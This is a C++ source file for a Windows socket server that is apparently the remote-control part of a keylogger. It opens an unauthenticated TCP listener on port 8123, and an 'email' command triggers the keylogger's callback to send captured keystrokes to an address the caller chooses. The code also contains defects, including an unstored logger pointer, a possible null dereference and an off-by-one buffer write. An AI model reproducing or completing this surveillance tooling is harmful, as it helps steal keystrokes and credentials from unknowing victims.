#include "stdafx.h"
#include "SocketServer.h"

void SocketServer::initHostInfo() {
	char ac[80];
	if (gethostname(ac, sizeof(ac)) == SOCKET_ERROR) {
		std::cerr << "Error " << WSAGetLastError() <<
			" when getting local host name." << endl;
	} else {
		this->hostName = ac;
	}
	

	struct hostent *phe = gethostbyname(ac);
	if (phe == 0) {
		std::cerr << "Yow! Bad host lookup." << endl;
	}

	std::string ip = "";
	for (int i = 0; phe->h_addr_list[i] != 0; ++i) {
		struct in_addr addr;
		memcpy(&addr, phe->h_addr_list[i], sizeof(struct in_addr));

		std::string possibleIp = inet_ntoa(addr);
		if (possibleIp.find('.') == 2 && possibleIp.at(0) == '1' || ip == "") {
			ip = possibleIp;
		}
	}
	
	this->ip = ip;
}

std::vector<std::string> SocketServer::parseRequest(std::string request) {
	std::vector<std::string> tokens;
	std::regex separator(" ");

	//start/end points of tokens in str
	std::sregex_token_iterator
		begin(request.begin(), request.end(), separator, -1),
		end;

	std::copy(begin, end, std::back_inserter(tokens));

	return tokens;
}

SocketServer::SocketServer(Keylogger* logger) {
	listenSocket = INVALID_SOCKET;

	std::cout << "socket";
	WSADATA wsaData;
	int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (result != 0) {
		cerr << "WSAStartup failed: " << result << "\n";
	}

	struct addrinfo* addr = nullptr;
	struct addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));

	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM; 
	hints.ai_protocol = IPPROTO_TCP; 

	hints.ai_flags = AI_PASSIVE;

	this->initHostInfo();
	std::cout << this->ip << " " << this->hostName << std::endl;

	result = getaddrinfo(ip.c_str(), "8123", &hints, &addr);

	if (result != 0) {
		cerr << "getaddrinfo failed: " << result << "\n";
		WSACleanup();
	}

	this->listenSocket = socket(addr->ai_family, addr->ai_socktype,
		addr->ai_protocol);

	if (this->listenSocket == INVALID_SOCKET) {
		cerr << "Error at socket: " << WSAGetLastError() << "\n";
		freeaddrinfo(addr);
		WSACleanup();
	}

	int bindResult = ::bind(this->listenSocket, addr->ai_addr, (int)addr->ai_addrlen);

	if (listen(this->listenSocket, SOMAXCONN) == SOCKET_ERROR) {
		cerr << "listen failed with error: " << WSAGetLastError() << "\n";
		closesocket(this->listenSocket);
		this->listenSocket = INVALID_SOCKET;
		WSACleanup();
	}
}

void SocketServer::start() {
	if (this->listenSocket == INVALID_SOCKET) {
		cerr << "socket is not active" << std::endl;
		return;
	}

	char requestBuffer[SOCKET_BUFFER_SIZE];
	int clientSocket = INVALID_SOCKET;

	while (true) {
		clientSocket = accept(this->listenSocket, NULL, NULL);
		std::cout << "accepted client: " << clientSocket << std::endl;

		if (clientSocket == INVALID_SOCKET) {
			cerr << "accept failed: " << WSAGetLastError() << std::endl;
			closesocket(this->listenSocket);
			WSACleanup();
			continue;
		}

		while (true) {
			int receivedSize = recv(clientSocket, requestBuffer, SOCKET_BUFFER_SIZE, 0);
			
			
			std::string response;

			if (receivedSize == SOCKET_ERROR) {
				cerr << "recv failed: " << receivedSize << std::endl;
				break;
			} else if (receivedSize == 0) {
				cerr << "connection closed..." << std::endl;
			} else if (receivedSize > 0) {
				requestBuffer[receivedSize] = '\0';
				std::string request = std::string(requestBuffer);
				std::cout << "received: " << request << std::endl;

				response = this->getResponse(request);

				int sendResult = send(clientSocket, response.c_str(),
					response.size(), 0);

				if (request.compare("exit") == 0) {
					break;
				}

				if (sendResult == SOCKET_ERROR) {
					cerr << "send failed: " << WSAGetLastError() << std::endl;
				}
			}
		}

		closesocket(clientSocket);
	}

}

std::string SocketServer::getResponse(std::string request) {
	std::stringstream responseStream;

	auto tokens = this->parseRequest(request);

	if (tokens[0] == "email") {
		auto emailTo = tokens.size() >= 2 ? tokens[1] : "";
		bool success = logger->sendEmailCallback(emailTo);
		responseStream << success;
	} else {
		responseStream << request << " ok";
	}

	return responseStream.str();
}

std::string SocketServer::getHostName() {
	return this->hostName;
}